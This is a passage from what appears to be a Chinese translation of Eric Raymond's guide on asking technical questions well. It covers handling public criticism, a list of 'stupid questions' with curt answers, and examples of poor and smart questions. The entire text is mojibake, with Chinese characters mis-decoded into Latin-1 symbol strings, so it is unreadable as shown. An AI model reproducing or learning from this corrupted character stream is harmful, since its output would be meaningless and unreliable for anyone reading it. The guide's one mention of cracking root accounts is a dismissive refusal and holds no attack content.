¼ç»¼åˆç—‡ï¼Œç¼ºå°‘ç”¨äºæ¶¦æ»‘äººç±»ç¤¾ä¼šæ­£å¸¸äº¤å¾€æ‰€éœ€çš„ç¥ç»ã€‚è¿™æ—¢å¯èƒ½æ˜¯çœŸä¹Ÿå¯èƒ½æ˜¯å‡çš„ã€‚å¦‚æœä½ è‡ªå·±ä¸æ˜¯é»‘å®¢ï¼Œå…´è®¸ä½ è®¤ä¸ºæˆ‘ä»¬è„‘è¢‹æœ‰é—®é¢˜è¿˜èƒ½å¸®åŠ©ä½ åº”ä»˜æˆ‘ä»¬çš„å¤æ€ªè¡Œä¸ºã€‚åªç®¡è¿™ä¹ˆå¹²å¥½äº†ï¼Œæˆ‘ä»¬ä¸åœ¨ä¹ã€‚æˆ‘ä»¬å–œæ¬¢æˆ‘ä»¬ç°åœ¨è¿™ä¸ªæ ·å­ï¼Œå¹¶ä¸”é€šå¸¸å¯¹ç—…æ‚£æ ‡è®°éƒ½æœ‰ç«™å¾—ä½è„šçš„æ€€ç–‘ã€‚ï¼‰\nJeff Bigler çš„è§‚å¯Ÿæ€»ç»“å’Œè¿™ä¸ªç›¸å…³ä¹Ÿå€¼å¾—ä¸€è¯» (tact filters)ã€‚\nåœ¨ä¸‹ä¸€èŠ‚ï¼Œæˆ‘ä»¬ä¼šè°ˆåˆ°å¦ä¸€ä¸ªé—®é¢˜ï¼Œå½“ä½ è¡Œä¸ºä¸å½“æ—¶æ‰€ä¼šå—åˆ°çš„å†’çŠ¯ã€‚\nå¦‚ä½•é¿å…æ‰®æ¼”å¤±è´¥è€… åœ¨é»‘å®¢ç¤¾åŒºçš„è®ºå›ä¸­ï¼Œä½ ä»¥æœ¬æŒ‡å—æ‰€æè¿°çš„æˆ–ç±»ä¼¼çš„æ–¹å¼ï¼Œå¯èƒ½ä¼šæœ‰é‚£ä¹ˆå‡ æ¬¡æç ¸äº†ã€‚è€Œä½ ä¼šåœ¨å…¬å¼€åœºåˆä¸­è¢«å‘ŠçŸ¥ä½ æ˜¯å¦‚ä½•æç ¸çš„ï¼Œä¹Ÿè®¸æ”»å‡»çš„è¨€è¯­ä¸­è¿˜ä¼šå¸¦ç‚¹å¤¹ä¸ƒå¤¹å…«çš„é¢œè‰²ã€‚\nè¿™ç§äº‹å‘ç”Ÿä»¥åï¼Œä½ èƒ½åšçš„æœ€ç³Ÿç³•çš„äº‹è«è¿‡äºå“€åšä½ çš„é­é‡ã€å®£ç§°è¢«è¨€è¯­æ”»å‡»ã€è¦æ±‚é“æ­‰ã€é«˜å£°å°–å«ã€æ†‹é—·æ°”ã€å¨èƒè¯‰è¯¸æ³•å¾‹ã€å‘å…¶é›‡ä¸»æŠ¥æ€¨ã€ä¸å»å…³é©¬æ¡¶ç›–ç­‰ç­‰ã€‚ç›¸ååœ°ï¼Œä½ è¯¥è¿™ä¹ˆåšï¼š\nç†¬è¿‡å»ï¼Œè¿™å¾ˆæ­£å¸¸ã€‚äº‹å®ä¸Šï¼Œå®ƒæ˜¯æœ‰ç›Šå¥åº·ä¸”åˆç†çš„ã€‚\nç¤¾åŒºçš„æ ‡å‡†ä¸ä¼šè‡ªè¡Œç»´æŒï¼Œå®ƒä»¬æ˜¯é€šè¿‡å‚ä¸è€…ç§¯æè€Œå…¬å¼€åœ°æ‰§è¡Œæ¥ç»´æŒçš„ã€‚ä¸è¦å“­åšæ‰€æœ‰çš„æ‰¹è¯„éƒ½åº”è¯¥é€šè¿‡ç§ä¸‹çš„é‚®ä»¶ä¼ é€ï¼Œå®ƒä¸æ˜¯è¿™æ ·è¿ä½œçš„ã€‚å½“æœ‰äººè¯„è®ºä½ çš„ä¸€ä¸ªè¯´æ³•æœ‰è¯¯æˆ–è€…æå‡ºä¸åŒçœ‹æ³•æ—¶ï¼ŒåšæŒå£°ç§°å—åˆ°ä¸ªäººæ”»å‡»ä¹Ÿæ¯«æ— ç›Šå¤„ï¼Œè¿™äº›éƒ½æ˜¯å¤±è´¥è€…çš„æ€åº¦ã€‚\nä¹Ÿæœ‰å…¶å®ƒçš„é»‘å®¢è®ºå›ï¼Œå—è¿‡é«˜ç¤¼èŠ‚è¦æ±‚çš„è¯¯å¯¼ï¼Œç¦æ­¢å‚ä¸è€…å¼ è´´ä»»ä½•å¯¹åˆ«äººå¸–å­æŒ‘æ¯›ç—…çš„æ¶ˆæ¯ï¼Œå¹¶å£°ç§°å¦‚æœä½ ä¸æƒ³å¸®åŠ©ç”¨æˆ·å°±é—­å˜´ã€‚ ç»“æœé€ æˆæœ‰æƒ³æ³•çš„å‚ä¸è€…çº·çº·ç¦»å¼€ï¼Œè¿™ä¹ˆåšåªä¼šä½¿å®ƒä»¬æ²¦ä¸ºæ¯«æ— æ„ä¹‰çš„å” å¨ä¸æ— ç”¨çš„æŠ€æœ¯è®ºå›ã€‚\nå¤¸å¼ çš„è®²æ³•æ˜¯ï¼šä½ è¦çš„æ˜¯â€œå‹å–„â€ï¼ˆä»¥ä¸Šè¿°æ–¹å¼ï¼‰è¿˜æ˜¯æœ‰ç”¨ï¼Ÿä¸¤ä¸ªé‡Œé¢æŒ‘ä¸€ä¸ªã€‚\nè®°ç€ï¼šå½“é»‘å®¢è¯´ä½ æç ¸äº†ï¼Œå¹¶ä¸”ï¼ˆæ— è®ºå¤šä¹ˆåˆºè€³ï¼‰å‘Šè¯‰ä½ åˆ«å†è¿™æ ·åšæ—¶ï¼Œä»–æ­£åœ¨ä¸ºå…³å¿ƒä½ å’Œä»–çš„ç¤¾åŒºè€Œè¡ŒåŠ¨ã€‚å¯¹ä»–è€Œè¨€ï¼Œä¸ç†ä½ å¹¶å°†ä½ ä»ä»–çš„ç”Ÿæ´»ä¸­æ»¤æ‰æ›´ç®€å•ã€‚å¦‚æœä½ æ— æ³•åšåˆ°æ„Ÿè°¢ï¼Œè‡³å°‘è¦è¡¨ç°å¾—æœ‰ç‚¹å°Šä¸¥ï¼Œåˆ«å¤§å£°å“€åšï¼Œä¹Ÿåˆ«å› ä¸ºè‡ªå·±æ˜¯ä¸ªæœ‰æˆå‰§æ€§è¶…çº§æ•æ„Ÿçš„çµé­‚å’Œè‡ªä»¥ä¸ºæœ‰èµ„æ ¼çš„æ–°æ¥è€…ï¼Œå°±æŒ‡æœ›åˆ«äººåƒå¯¹å¾…è„†å¼±çš„æ´‹å¨ƒå¨ƒé‚£æ ·å¯¹ä½ ã€‚\næœ‰æ—¶å€™ï¼Œå³ä½¿ä½ æ²¡æœ‰æç ¸ï¼ˆæˆ–è€…åªæ˜¯åœ¨ä»–çš„æƒ³åƒä¸­ä½ æç ¸äº†ï¼‰ï¼Œæœ‰äº›äººä¹Ÿä¼šæ— ç¼˜æ— æ•…åœ°æ”»å‡»ä½ æœ¬äººã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒæŠ±æ€¨å€’æ˜¯çœŸçš„ä¼šæŠŠé—®é¢˜æç ¸ã€‚\nè¿™äº›æ¥æ‰¾éº»çƒ¦çš„äººè¦ä¹ˆæ˜¯æ¯«æ— åŠæ³•ä½†è‡ªä»¥ä¸ºæ˜¯ä¸“å®¶çš„ä¸ä¸­ç”¨å®¶ä¼™ï¼Œè¦ä¹ˆå°±æ˜¯æµ‹è¯•ä½ æ˜¯å¦çœŸä¼šæç ¸çš„å¿ƒç†ä¸“å®¶ã€‚å…¶å®ƒè¯»è€…è¦ä¹ˆä¸ç†ç¬ï¼Œè¦ä¹ˆç”¨è‡ªå·±çš„æ–¹å¼å¯¹ä»˜ä»–ä»¬ã€‚è¿™äº›æ¥æ‰¾éº»çƒ¦çš„äººåœ¨ç»™ä»–ä»¬è‡ªå·±æ‰¾éº»çƒ¦ï¼Œè¿™ç‚¹ä½ ä¸ç”¨æ“å¿ƒã€‚\nä¹Ÿåˆ«è®©è‡ªå·±å·å…¥å£æ°´æˆ˜ï¼Œæœ€å¥½ä¸è¦ç†ç¬å¤§å¤šæ•°çš„å£æ°´æˆ˜ â€”â€” å½“ç„¶ï¼Œè¿™æ˜¯åœ¨ä½ æ£€éªŒå®ƒä»¬åªæ˜¯å£æ°´æˆ˜ï¼Œå¹¶ä¸”æœªæŒ‡å‡ºä½ æœ‰æç ¸çš„åœ°æ–¹ï¼ŒåŒæ—¶ä¹Ÿæ²¡æœ‰å·§å¦™åœ°å°†é—®é¢˜çœŸæ­£çš„ç­”æ¡ˆè—äºå…¶åï¼ˆè¿™ä¹Ÿæ˜¯æœ‰å¯èƒ½çš„ï¼‰ã€‚\nä¸è¯¥é—®çš„é—®é¢˜ ä»¥ä¸‹æ˜¯å‡ ä¸ªç»å…¸è ¢é—®é¢˜ï¼Œä»¥åŠé»‘å®¢æ²¡å›ç­”æ—¶å¿ƒä¸­æ‰€æƒ³çš„ï¼š\né—®é¢˜ï¼šæˆ‘èƒ½åœ¨å“ªæ‰¾åˆ° X ç¨‹åºæˆ– X èµ„æºï¼Ÿ\né—®é¢˜ï¼šæˆ‘æ€æ ·ç”¨ X åš Yï¼Ÿ\né—®é¢˜ï¼šå¦‚ä½•è®¾å®šæˆ‘çš„ shell æç¤ºï¼Ÿ\né—®é¢˜ï¼šæˆ‘å¯ä»¥ç”¨ Bass-o-matic æ–‡ä»¶è½¬æ¢å·¥å…·å°† AcmeCorp æ–‡ä»¶è½¬æ¢ä¸º TeX æ ¼å¼å—ï¼Ÿ\né—®é¢˜ï¼šæˆ‘çš„ç¨‹åº/è®¾å®š/SQL è¯­å¥æ²¡æœ‰ç”¨\né—®é¢˜ï¼šæˆ‘çš„ Windows ç”µè„‘æœ‰é—®é¢˜ï¼Œä½ èƒ½å¸®æˆ‘å—ï¼Ÿ\né—®é¢˜ï¼šæˆ‘çš„ç¨‹åºä¸ä¼šåŠ¨äº†ï¼Œæˆ‘è®¤ä¸ºç³»ç»Ÿå·¥å…· X æœ‰é—®é¢˜\né—®é¢˜ï¼šæˆ‘åœ¨å®‰è£… Linuxï¼ˆæˆ–è€… X ï¼‰æ—¶æœ‰é—®é¢˜ï¼Œä½ èƒ½å¸®æˆ‘å—ï¼Ÿ\né—®é¢˜ï¼šæˆ‘æ€ä¹ˆæ‰èƒ½ç ´è§£ root å¸å·/çªƒå– OP ç‰¹æƒ/è¯»åˆ«äººçš„é‚®ä»¶å‘¢ï¼Ÿ\né—®é¢˜ï¼šæˆ‘èƒ½åœ¨å“ªæ‰¾åˆ° X ç¨‹åºæˆ– X èµ„æºï¼Ÿ\nå›ç­”ï¼šå°±åœ¨æˆ‘æ‰¾åˆ°å®ƒçš„åœ°æ–¹å•Šï¼Œç™½ç—´ â€”â€” æœç´¢å¼•æ“çš„é‚£ä¸€å¤´ã€‚å¤©å“ªï¼éš¾é“è¿˜æœ‰äººä¸ä¼šç”¨ Google å—ï¼Ÿ\né—®é¢˜ï¼šæˆ‘æ€æ ·ç”¨ X åš Yï¼Ÿ\nå›ç­”ï¼šå¦‚æœä½ æƒ³è§£å†³çš„æ˜¯ Y ï¼Œæé—®æ—¶åˆ«ç»™å‡ºå¯èƒ½å¹¶ä¸æ°å½“çš„æ–¹æ³•ã€‚è¿™ç§é—®é¢˜è¯´æ˜æé—®è€…ä¸ä½†å¯¹ X å®Œå…¨æ— çŸ¥ï¼Œä¹Ÿå¯¹ Y è¦è§£å†³çš„é—®é¢˜ç³Šæ¶‚ï¼Œè¿˜è¢«ç‰¹å®šå½¢åŠ¿ç¦é”¢äº†æ€ç»´ã€‚æœ€å¥½å¿½ç•¥è¿™ç§äººï¼Œç­‰ä»–ä»¬æŠŠé—®é¢˜ææ¸…æ¥šäº†å†è¯´ã€‚\né—®é¢˜ï¼šå¦‚ä½•è®¾å®šæˆ‘çš„ shell æç¤ºï¼Ÿï¼Ÿ\nå›ç­”ï¼šå¦‚æœä½ æœ‰è¶³å¤Ÿçš„æ™ºæ…§æè¿™ä¸ªé—®é¢˜ï¼Œä½ ä¹Ÿè¯¥æœ‰è¶³å¤Ÿçš„æ™ºæ…§å» RTFMï¼Œç„¶åè‡ªå·±å»æ‰¾å‡ºæ¥ã€‚\né—®é¢˜ï¼šæˆ‘å¯ä»¥ç”¨ Bass-o-matic æ–‡ä»¶è½¬æ¢å·¥å…·å°† AcmeCorp æ–‡ä»¶è½¬æ¢ä¸º TeX æ ¼å¼å—ï¼Ÿ\nå›ç­”ï¼šè¯•è¯•çœ‹å°±çŸ¥é“äº†ã€‚å¦‚æœä½ è¯•è¿‡ï¼Œä½ å°±çŸ¥é“äº†ç­”æ¡ˆï¼Œå°±ä¸ç”¨æµªè´¹æˆ‘çš„æ—¶é—´äº†ã€‚\né—®é¢˜ï¼šæˆ‘çš„{ç¨‹åº/è®¾å®š/SQL è¯­å¥}æ²¡æœ‰ç”¨\nå›ç­”ï¼šè¿™ä¸ç®—æ˜¯é—®é¢˜å§ï¼Œæˆ‘å¯¹è¦æˆ‘é—®ä½ äºŒåä¸ªé—®é¢˜æ‰æ‰¾å¾—å‡ºä½ çœŸæ­£é—®é¢˜çš„é—®é¢˜æ²¡å…´è¶£ â€”â€” æˆ‘æœ‰æ›´æœ‰æ„æ€çš„äº‹è¦åšå‘¢ã€‚åœ¨çœ‹åˆ°è¿™ç±»é—®é¢˜çš„æ—¶å€™ï¼Œæˆ‘çš„ååº”é€šå¸¸ä¸å¤–å¦‚ä¸‹ä¸‰ç§\nä½ è¿˜æœ‰ä»€ä¹ˆè¦è¡¥å……çš„å—ï¼Ÿ çœŸç³Ÿç³•ï¼Œå¸Œæœ›ä½ èƒ½æå®šã€‚ è¿™å…³æˆ‘å±äº‹ï¼Ÿ é—®é¢˜ï¼šæˆ‘çš„ Windows ç”µè„‘æœ‰é—®é¢˜ï¼Œä½ èƒ½å¸®æˆ‘å—ï¼Ÿ\nå›ç­”ï¼šèƒ½å•Šï¼Œæ‰”æ‰å¾®è½¯çš„åƒåœ¾ï¼Œæ¢ä¸ªåƒ Linux æˆ– BSD çš„å¼€æºæ“ä½œç³»ç»Ÿå§ã€‚\næ³¨æ„ï¼šå¦‚æœç¨‹åºæœ‰å®˜æ–¹ç‰ˆ Windows æˆ–è€…ä¸ Windows æœ‰äº’åŠ¨ï¼ˆå¦‚ Sambaï¼‰ï¼Œä½ å¯ä»¥é—®ä¸ Windows ç›¸å…³çš„é—®é¢˜ï¼Œåªæ˜¯åˆ«å¯¹é—®é¢˜æ˜¯ç”± Windows æ“ä½œç³»ç»Ÿè€Œä¸æ˜¯ç¨‹åºæœ¬èº«é€ æˆçš„å›å¤æ„Ÿåˆ°æƒŠè®¶ï¼Œ å› ä¸º Windows ä¸€èˆ¬æ¥è¯´å®åœ¨å¤ªçƒ‚ï¼Œè¿™ç§è¯´æ³•é€šå¸¸éƒ½æ˜¯å¯¹çš„ã€‚\né—®é¢˜ï¼šæˆ‘çš„ç¨‹åºä¸ä¼šåŠ¨äº†ï¼Œæˆ‘è®¤ä¸ºç³»ç»Ÿå·¥å…· X æœ‰é—®é¢˜\nå›ç­”ï¼šä½ å®Œå…¨æœ‰å¯èƒ½æ˜¯ç¬¬ä¸€ä¸ªæ³¨æ„åˆ°è¢«æˆåƒä¸Šä¸‡ç”¨æˆ·åå¤ä½¿ç”¨çš„ç³»ç»Ÿè°ƒç”¨ä¸å‡½æ•°åº“æ–‡ä»¶æœ‰æ˜æ˜¾ç¼ºé™·çš„äººï¼Œæ›´æœ‰å¯èƒ½çš„æ˜¯ä½ å®Œå…¨æ²¡æœ‰æ ¹æ®ã€‚ä¸åŒå‡¡å“çš„è¯´æ³•éœ€è¦ä¸åŒå‡¡å“çš„è¯æ®ï¼Œå½“ä½ è¿™æ ·å£°ç§°æ—¶ï¼Œä½ å¿…é¡»æœ‰æ¸…æ¥šè€Œè¯¦å°½çš„ç¼ºé™·è¯´æ˜æ–‡ä»¶ä½œåç›¾ã€‚\né—®é¢˜ï¼šæˆ‘åœ¨å®‰è£… Linuxï¼ˆæˆ–è€… X ï¼‰æ—¶æœ‰é—®é¢˜ï¼Œä½ èƒ½å¸®æˆ‘å—ï¼Ÿ\nå›ç­”ï¼šä¸èƒ½ï¼Œæˆ‘åªæœ‰äº²è‡ªåœ¨ä½ çš„ç”µè„‘ä¸ŠåŠ¨æ‰‹æ‰èƒ½æ‰¾åˆ°æ¯›ç—…ã€‚è¿˜æ˜¯å»æ‰¾ä½ å½“åœ°çš„ Linux ä½¿ç”¨ç¾¤ç»„è€…å¯»æ±‚å®é™…çš„æŒ‡å¯¼å§ï¼ˆä½ èƒ½åœ¨è¿™å„¿æ‰¾åˆ°ç”¨æˆ·ç¾¤ç»„çš„æ¸…å•ï¼‰ã€‚\næ³¨æ„ï¼šå¦‚æœå®‰è£…é—®é¢˜ä¸æŸ Linux çš„å‘è¡Œç‰ˆæœ‰å…³ï¼Œåœ¨å®ƒçš„é‚®ä»¶åˆ—è¡¨ã€è®ºå›æˆ–æœ¬åœ°ç”¨æˆ·ç¾¤ç»„ä¸­æé—®ä¹Ÿè®¸æ˜¯æ°å½“çš„ã€‚æ­¤æ—¶ï¼Œåº”æè¿°é—®é¢˜çš„å‡†ç¡®ç»†èŠ‚ã€‚åœ¨æ­¤ä¹‹å‰ï¼Œå…ˆç”¨ Linux å’Œæ‰€æœ‰è¢«æ€€ç–‘çš„ç¡¬ä»¶ä½œå…³é”®è¯ä»”ç»†æœç´¢ã€‚\né—®é¢˜ï¼šæˆ‘æ€ä¹ˆæ‰èƒ½ç ´è§£ root å¸å·/çªƒå– OP ç‰¹æƒ/è¯»åˆ«äººçš„é‚®ä»¶å‘¢ï¼Ÿ\nå›ç­”ï¼šæƒ³è¦è¿™æ ·åšï¼Œè¯´æ˜äº†ä½ æ˜¯ä¸ªå‘é„™å°äººï¼›æƒ³æ‰¾ä¸ªé»‘å®¢å¸®ä½ ï¼Œè¯´æ˜ä½ æ˜¯ä¸ªç™½ç—´ï¼\nå¥½é—®é¢˜ä¸è ¢é—®é¢˜ æœ€åï¼Œæˆ‘å°†é€è¿‡ä¸¾ä¸€äº›ä¾‹å­ï¼Œæ¥è¯´æ˜æ€æ ·èªæ˜çš„æé—®ï¼›åŒä¸€ä¸ªé—®é¢˜çš„ä¸¤ç§é—®æ³•è¢«æ”¾åœ¨ä¸€èµ·ï¼Œä¸€ç§æ˜¯æ„šè ¢çš„ï¼Œå¦ä¸€ç§æ‰æ˜¯æ˜æ™ºçš„ã€‚\nè ¢é—®é¢˜ï¼š\næˆ‘å¯ä»¥åœ¨å“ªå„¿æ‰¾åˆ°å…³äº Foonly Flurbamatic çš„èµ„æ–™ï¼Ÿ\nè¿™ç§é—®æ³•æ— éæƒ³å¾—åˆ° STFW è¿™æ ·çš„å›ç­”ã€‚\nèªæ˜é—®é¢˜ï¼š\næˆ‘ç”¨ Google æœç´¢è¿‡ \u0026ldquo;Foonly Flurbamatic 2600\u0026rdquo;ï¼Œä½†æ˜¯æ²¡æ‰¾åˆ°æœ‰ç”¨çš„ç»“æœã€‚è°çŸ¥é“ä¸Šå“ªå„¿å»æ‰¾å¯¹è¿™ç§è®¾å¤‡ç¼–ç¨‹çš„èµ„æ–™ï¼Ÿ\nè¿™ä¸ªé—®é¢˜å·²ç» STFW è¿‡äº†ï¼Œçœ‹èµ·æ¥ä»–çœŸçš„é‡åˆ°äº†éº»çƒ¦ã€‚\nè ¢é—®é¢˜ï¼š\næˆ‘ä» foo é¡¹ç›®æ‰¾æ¥çš„æºç æ²¡æ³•ç¼–è¯‘ã€‚å®ƒæ€ä¹ˆè¿™ä¹ˆçƒ‚ï¼Ÿ\nä»–è§‰å¾—éƒ½æ˜¯åˆ«äººçš„é”™ï¼Œè¿™ä¸ªå‚²æ…¢è‡ªå¤§çš„æé—®è€…ã€‚\nèªæ˜é—®é¢˜ï¼š\nfoo é¡¹ç›®ä»£ç åœ¨ Nulix 6.2 ç‰ˆä¸‹æ— æ³•ç¼–è¯‘é€šè¿‡ã€‚æˆ‘è¯»è¿‡äº† FAQï¼Œä½†é‡Œé¢æ²¡æœ‰æåˆ°è·Ÿ Nulix æœ‰å…³çš„é—®é¢˜ã€‚è¿™æ˜¯æˆ‘ç¼–è¯‘è¿‡ç¨‹çš„è®°å½•ï¼Œæˆ‘æœ‰ä»€ä¹ˆåšçš„ä¸å¯¹çš„åœ°æ–¹å—ï¼Ÿ\næé—®è€…å·²ç»æŒ‡æ˜äº†ç¯å¢ƒï¼Œä¹Ÿè¯»è¿‡äº† FAQï¼Œè¿˜åˆ—å‡ºäº†é”™è¯¯ï¼Œå¹¶ä¸”ä»–æ²¡æœ‰æŠŠé—®é¢˜çš„è´£ä»»æ¨åˆ°åˆ«äººå¤´ä¸Šï¼Œä»–çš„é—®é¢˜å€¼å¾—è¢«å…³æ³¨ã€‚\nè ¢é—®é¢˜ï¼š\næˆ‘çš„ä¸»æœºæ¿æœ‰é—®é¢˜äº†ï¼Œè°æ¥å¸®æˆ‘ï¼Ÿ\næŸé»‘å®¢å¯¹è¿™ç±»é—®é¢˜çš„å›ç­”é€šå¸¸æ˜¯ï¼šå¥½çš„ï¼Œè¿˜è¦å¸®ä½ æ‹æ‹èƒŒå’Œæ¢å°¿å¸ƒå—ï¼Ÿï¼Œç„¶åæŒ‰ä¸‹åˆ é™¤é”®ã€‚\nèªæ˜é—®é¢˜ï¼š\næˆ‘åœ¨ S2464 ä¸»æœºæ¿ä¸Šè¯•è¿‡äº† X ã€ Y å’Œ Z ï¼Œä½†æ²¡ä»€ä¹ˆä½œç”¨ï¼Œæˆ‘åˆè¯•äº† A ã€ B å’Œ C ã€‚è¯·æ³¨æ„å½“æˆ‘å°è¯• C æ—¶çš„å¥‡æ€ªç°è±¡ã€‚æ˜¾ç„¶ florbish æ­£åœ¨ grommickingï¼Œä½†ç»“æœå‡ºäººæ„æ–™ã€‚é€šå¸¸åœ¨ Athlon MP ä¸»æœºæ¿ä¸Šå¼•èµ· grommicking çš„åŸå› æ˜¯ä»€ä¹ˆï¼Ÿæœ‰è°çŸ¥é“æ¥ä¸‹æ¥æˆ‘è¯¥åšäº›ä»€ä¹ˆæµ‹è¯•æ‰èƒ½æ‰¾å‡ºé—®é¢˜ï¼Ÿ\nè¿™ä¸ªå®¶ä¼™ï¼Œä»å¦ä¸€ä¸ªè§’åº¦æ¥çœ‹ï¼Œå€¼å¾—å»å›ç­”ä»–ã€‚ä»–è¡¨ç°å‡ºäº†è§£å†³é—®é¢˜çš„èƒ½åŠ›ï¼Œè€Œä¸æ˜¯åç­‰å¤©ä¸Šæ‰ç­”æ¡ˆã€‚\nåœ¨æœ€åä¸€ä¸ªé—®é¢˜ä¸­ï¼Œæ³¨æ„å‘Šè¯‰æˆ‘ç­”æ¡ˆå’Œç»™æˆ‘å¯ç¤ºï¼ŒæŒ‡å‡ºæˆ‘è¿˜åº”è¯¥åšä»€ä¹ˆè¯Šæ–­å·¥ä½œä¹‹é—´å¾®å¦™è€Œåˆé‡è¦çš„åŒºåˆ«ã€‚\näº‹å®ä¸Šï¼Œåä¸€ä¸ªé—®é¢˜æºè‡ªäº 2001 å¹´ 8 æœˆåœ¨ Linux å†…æ ¸é‚®ä»¶åˆ—è¡¨ï¼ˆlkmlï¼‰ä¸Šçš„ä¸€ä¸ªçœŸå®çš„æé—®ã€‚æˆ‘ï¼ˆEricï¼‰å°±æ˜¯é‚£ä¸ªæå‡ºé—®é¢˜çš„äººã€‚æˆ‘åœ¨ Tyan S2464 ä¸»æ¿ä¸Šè§‚å¯Ÿåˆ°äº†è¿™ç§æ— æ³•è§£é‡Šçš„é”å®šç°è±¡ï¼Œåˆ—è¡¨æˆå‘˜ä»¬æä¾›äº†è§£å†³è¿™ä¸€é—®é¢˜çš„é‡è¦ä¿¡æ¯ã€‚\né€šè¿‡æˆ‘çš„æé—®æ–¹æ³•ï¼Œæˆ‘ç»™äº†åˆ«äººå¯ä»¥å’€åš¼ç©å‘³çš„ä¸œè¥¿ï¼›æˆ‘è®¾æ³•è®©äººä»¬å¾ˆå®¹æ˜“å‚ä¸å¹¶ä¸”è¢«å¸å¼•è¿›æ¥ã€‚æˆ‘æ˜¾ç¤ºäº†è‡ªå·±å…·å¤‡å’Œä»–ä»¬åŒç­‰çš„èƒ½åŠ›ï¼Œå¹¶é‚€è¯·ä»–ä»¬ä¸æˆ‘å…±åŒæ¢è®¨ã€‚é€šè¿‡å‘Šè¯‰ä»–ä»¬æˆ‘æ‰€èµ°è¿‡çš„å¼¯è·¯ï¼Œä»¥é¿å…ä»–ä»¬å†æµªè´¹æ—¶é—´ï¼Œæˆ‘ä¹Ÿè¡¨æ˜äº†å¯¹ä»–ä»¬å®è´µæ—¶é—´çš„å°Šé‡ã€‚\näº‹åï¼Œå½“æˆ‘å‘æ¯ä¸ªäººè¡¨ç¤ºæ„Ÿè°¢ï¼Œå¹¶ä¸”èµèµè¿™æ¬¡è‰¯å¥½çš„è®¨è®ºç»å†çš„æ—¶å€™ï¼Œä¸€ä¸ª Linux å†…æ ¸é‚®ä»¶åˆ—è¡¨çš„æˆå‘˜è¡¨ç¤ºï¼Œä»–è§‰å¾—æˆ‘çš„é—®é¢˜å¾—åˆ°è§£å†³å¹¶éç”±äºæˆ‘æ˜¯è¿™ä¸ªåˆ—è¡¨ä¸­çš„åäººï¼Œè€Œæ˜¯å› ä¸ºæˆ‘ç”¨äº†æ­£ç¡®çš„æ–¹å¼æ¥æé—®ã€‚\né»‘å®¢ä»æŸç§è§’åº¦æ¥è¯´æ˜¯æ‹¥æœ‰ä¸°å¯ŒçŸ¥è¯†ä½†ç¼ºä¹äººæƒ…å‘³çš„å®¶ä¼™ï¼›æˆ‘ç›¸ä¿¡ä»–æ˜¯å¯¹çš„ï¼Œå¦‚æœæˆ‘åƒä¸ªä¹è®¨è€…é‚£æ ·æé—®ï¼Œä¸è®ºæˆ‘æ˜¯è°ï¼Œä¸€å®šä¼šæƒ¹æ¼æŸäº›äººæˆ–è€…è¢«ä»–ä»¬å¿½è§†ã€‚ä»–å»ºè®®æˆ‘è®°ä¸‹è¿™ä»¶äº‹ï¼Œè¿™ç›´æ¥å¯¼è‡´äº†æœ¬æŒ‡å—çš„å‡ºç°ã€‚\nå¦‚æœå¾—ä¸åˆ°å›ç­” å¦‚æœä»å¾—ä¸åˆ°å›ç­”ï¼Œè¯·ä¸è¦ä»¥ä¸ºæˆ‘ä»¬è§‰å¾—æ— æ³•å¸®åŠ©ä½ ã€‚æœ‰æ—¶åªæ˜¯çœ‹åˆ°ä½ é—®é¢˜çš„äººä¸çŸ¥é“ç­”æ¡ˆç½¢äº†ã€‚æ²¡æœ‰å›åº”ä¸ä»£è¡¨ä½ è¢«å¿½è§†ï¼Œè™½ç„¶ä¸å¯å¦è®¤è¿™ç§å·®åˆ«å¾ˆéš¾åŒºåˆ†ã€‚\næ€»çš„æ¥è¯´ï¼Œç®€å•åœ°é‡å¤å¼ è´´é—®é¢˜æ˜¯ä¸ªå¾ˆç³Ÿçš„ç‚¹å­ã€‚è¿™å°†è¢«è§†ä¸ºæ— æ„ä¹‰çš„å–§é—¹ã€‚æœ‰ç‚¹è€å¿ƒï¼ŒçŸ¥é“ä½ é—®é¢˜ç­”æ¡ˆçš„äººå¯èƒ½ç”Ÿæ´»åœ¨ä¸åŒçš„æ—¶åŒºï¼Œå¯èƒ½æ­£åœ¨ç¡è§‰ï¼Œä¹Ÿæœ‰å¯èƒ½ä½ çš„é—®é¢˜ä¸€å¼€å§‹å°±æ²¡æœ‰ç»„ç»‡å¥½ã€‚\nä½ å¯ä»¥é€šè¿‡å…¶ä»–æ¸ é“è·å¾—å¸®åŠ©ï¼Œè¿™äº›æ¸ é“é€šå¸¸æ›´é€‚åˆåˆå­¦è€…çš„éœ€è¦ã€‚\næœ‰è®¸å¤šç½‘ä¸Šçš„ä»¥åŠæœ¬åœ°çš„ç”¨æˆ·ç¾¤ç»„ï¼Œç”±çƒ­æƒ…çš„è½¯ä»¶çˆ±å¥½è€…ï¼ˆå³ä½¿ä»–ä»¬å¯èƒ½ä»æ²¡äº²è‡ªå†™è¿‡ä»»ä½•è½¯ä»¶ï¼‰ç»„æˆã€‚é€šå¸¸äººä»¬ç»„å»ºè¿™æ ·çš„å›¢ä½“æ¥äº’ç›¸å¸®åŠ©å¹¶å¸®åŠ©æ–°æ‰‹ã€‚\nå¦å¤–ï¼Œä½ å¯ä»¥å‘å¾ˆå¤šå•†ä¸šå…¬å¸å¯»æ±‚å¸®åŠ©ï¼Œä¸è®ºå…¬å¸å¤§è¿˜æ˜¯å°ã€‚åˆ«ä¸ºè¦ä»˜è´¹æ‰èƒ½è·å¾—å¸®åŠ©è€Œæ„Ÿåˆ°æ²®ä¸§ï¼æ¯•ç«Ÿï¼Œå‡ä½¿ä½ çš„æ±½è½¦å‘åŠ¨æœºæ±½ç¼¸å¯†å°åœˆçˆ†æ‰äº† â€”â€” å®Œå…¨å¯èƒ½å¦‚æ­¤ â€”â€” ä½ è¿˜å¾—æŠŠå®ƒé€åˆ°ä¿®è½¦é“ºï¼Œå¹¶ä¸”ä¸ºç»´ä¿®ä»˜è´¹ã€‚å°±ç®—è½¯ä»¶æ²¡èŠ±è´¹ä½ ä¸€åˆ†é’±ï¼Œä½ ä¹Ÿä¸èƒ½å¼ºæ±‚æŠ€æœ¯æ”¯æŒæ€»æ˜¯å…è´¹çš„ã€‚\nå¯¹åƒæ˜¯ Linux è¿™ç§å¤§ä¼—åŒ–çš„è½¯ä»¶ï¼Œæ¯ä¸ªå¼€å‘è€…è‡³å°‘ä¼šå¯¹åº”åˆ°ä¸Šä¸‡åç”¨æˆ·ã€‚æ 